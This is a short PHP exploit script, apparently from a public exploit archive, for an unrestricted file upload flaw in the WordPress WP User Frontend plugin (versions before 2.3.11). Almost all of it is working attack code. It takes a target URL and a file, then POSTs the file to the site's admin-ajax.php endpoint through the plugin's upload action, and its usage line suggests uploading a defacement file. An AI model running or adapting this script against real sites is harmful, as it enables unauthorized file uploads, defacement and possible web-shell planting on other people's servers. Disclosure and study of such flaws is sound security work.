<?php
/*
* Exploit Title: WordPress WP User Frontend Plugin [Unrestricted File Upload]
* Discovery Date: 2016-02-04
* Public Disclosure: 2016-02-08
* Exploit Author: Munir Njiru
* Contact: https://twitter.com/muntopia
* Vendor Homepage: https://wedevs.com
* Software Link: https://wordpress.org/plugins/wp-user-frontend
* Version: < 2.3.11
* Tested on: WordPress 4.4.2
* Category: WebApps, WordPress
*/
echo "#####################################################################################\n\n";
echo "\nWordPress WP User Frontend Plugin [Unrestricted File Upload] by Alienwithin \n";
echo "Site: http://munir.skilledsoft.com \n\n";
echo "Usage: php script_name.php target_host file_to_upload \n\n";
echo "Example: php wp_userfrontend_ufu.php http://target.com deface.txt\n\n ";
echo "#####################################################################################\n\n";
	
$target=$argv[1];
$file=$argv[2];

$request = curl_init($target.'/wp-admin/admin-ajax.php');

curl_setopt($request, CURLOPT_POST, true);
curl_setopt(
    $request,
    CURLOPT_POSTFIELDS,
    array(
      'wpuf_file' => '@' . realpath($file),
	  'action' =>'wpuf_file_upload'
    ));

curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
echo curl_exec($request);

curl_close($request);

?>
